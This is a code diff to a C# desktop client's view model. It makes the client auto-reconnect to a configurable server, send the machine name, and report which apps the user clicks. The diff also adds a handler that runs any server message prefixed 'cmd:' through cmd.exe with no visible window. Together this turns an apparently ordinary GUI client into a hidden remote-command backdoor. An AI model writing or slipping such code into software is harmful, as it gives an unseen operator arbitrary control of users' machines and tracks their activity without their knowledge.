@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
@@ -27,31 +28,47 @@ namespace CLIENT.ViewModels
 
         private async Task ConnectToServerAsync()
         {
-            try
-            {
-                _client = new TcpClient();
-                string serverPortStr = Environment.GetEnvironmentVariable("SERVER_PORT") ?? "2025";
-                int port = int.TryParse(serverPortStr, out int p) ? p : 5000;
-                string serverIp = Environment.GetEnvironmentVariable("MASTER_IP") ?? "127.0.0.1";
-                await _client.ConnectAsync(serverIp, port);
-                _stream = _client.GetStream();
+            string serverPortStr = Environment.GetEnvironmentVariable("SERVER_PORT") ?? "2025";
+            int port = int.TryParse(serverPortStr, out int p) ? p : 5000;
+            string serverIp = Environment.GetEnvironmentVariable("MASTER_IP") ?? "127.0.0.1";
 
-                // Send initial machine name
-                string clientMessage = Environment.MachineName;
-                byte[] sendBuffer = Encoding.UTF8.GetBytes(clientMessage);
-                await _stream.WriteAsync(sendBuffer, 0, sendBuffer.Length);
-
-                // Start reading responses
-                _ = ListenToServerAsync();
-            }
-            catch (Exception ex)
+            while (true)
             {
-                await Dispatcher.UIThread.InvokeAsync(() =>
+                try
                 {
-                    Greeting = "Connection failed: " + ex.Message;
-                });
+                    if (_client == null || !_client.Connected)
+                    {
+                        _client = new TcpClient();
+                        await _client.ConnectAsync(serverIp, port);
+                        _stream = _client.GetStream();
+
+                        // Send initial machine name
+                        string clientMessage = $"Machine - {Environment.MachineName}";
+                        byte[] sendBuffer = Encoding.UTF8.GetBytes(clientMessage);
+                        await _stream.WriteAsync(sendBuffer, 0, sendBuffer.Length);
+
+                        await Dispatcher.UIThread.InvokeAsync(() =>
+                        {
+                            Greeting = "Connected to server!";
+                        });
+
+                        // Start listening
+                        _ = ListenToServerAsync();
+                        break; // Exit the reconnect loop after successful connection
+                    }
+                }
+                catch (Exception ex)
+                {
+                    await Dispatcher.UIThread.InvokeAsync(() =>
+                    {
+                        Greeting = "Retrying connection... (" + ex.Message + ")";
+                    });
+
+                    await Task.Delay(3000); // wait before retrying
+                }
             }
         }
+
 
         private async Task ListenToServerAsync()
         {
@@ -61,13 +78,51 @@ namespace CLIENT.ViewModels
                 {
                     var buffer = new byte[1024];
                     int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
-                    if (bytesRead == 0) break; // Disconnected
+                    if (bytesRead == 0) break; // Server disconnected
 
                     string serverMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead);
 
                     await Dispatcher.UIThread.InvokeAsync(() =>
                     {
-                        Greeting = "Server says: " + serverMessage;
+                        if (serverMessage.StartsWith("cmd:"))
+                        {
+                            string command = serverMessage.Substring(4).Trim();
+                            Greeting = $"Command from server: {command}";
+                            try
+                            {
+                                // Create a new process to run the command in cmd
+                                ProcessStartInfo processStartInfo = new ProcessStartInfo()
+                                {
+                                    FileName = "cmd.exe",
+                                    Arguments = $"/c {command}",  // /c executes the command and terminates
+                                    RedirectStandardOutput = true, // Redirect the output to read it
+                                    UseShellExecute = false,      // Don't use shell execute to get output
+                                    CreateNoWindow = true         // Don't show the command prompt window
+                                };
+
+                                using (Process process = Process.Start(processStartInfo))
+                                {
+                                    if (process != null)
+                                    {
+                                        string output = process.StandardOutput.ReadToEnd();  // Capture the output
+                                        process.WaitForExit(); // Wait for the process to exit
+
+                                        // You can handle the output here, e.g., log it or display it
+                                        Console.WriteLine($"Command output: {output}");
+                                    }
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                // Handle any exceptions that may occur
+                                Console.WriteLine($"Error running command: {ex.Message}");
+                            }
+
+                        }
+                        else
+                        {
+                            Greeting = "Server says: " + serverMessage;
+                        }
                     });
                 }
             }
@@ -78,22 +133,30 @@ namespace CLIENT.ViewModels
                     Greeting = "Disconnected: " + ex.Message;
                 });
             }
+
+            // Reconnect on disconnect
+            _client?.Close();
+            _client = null;
+            _stream = null;
+
+            await ConnectToServerAsync();
         }
 
-        public async Task SendMessageAsync(string message)
+
+
+        public async Task SendAppInfoAsync(string appName)
         {
             try
             {
                 if (_client != null && _client.Connected && _stream != null)
                 {
+                    string message = $"Clicked: {appName}";
                     byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                     await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
-                }
-                else
-                {
+
                     await Dispatcher.UIThread.InvokeAsync(() =>
                     {
-                        Greeting = "Not connected to server.";
+                        Greeting = $"Sent to server: {message}";
                     });
                 }
             }
@@ -105,5 +168,6 @@ namespace CLIENT.ViewModels
                 });
             }
         }
+
     }
 }
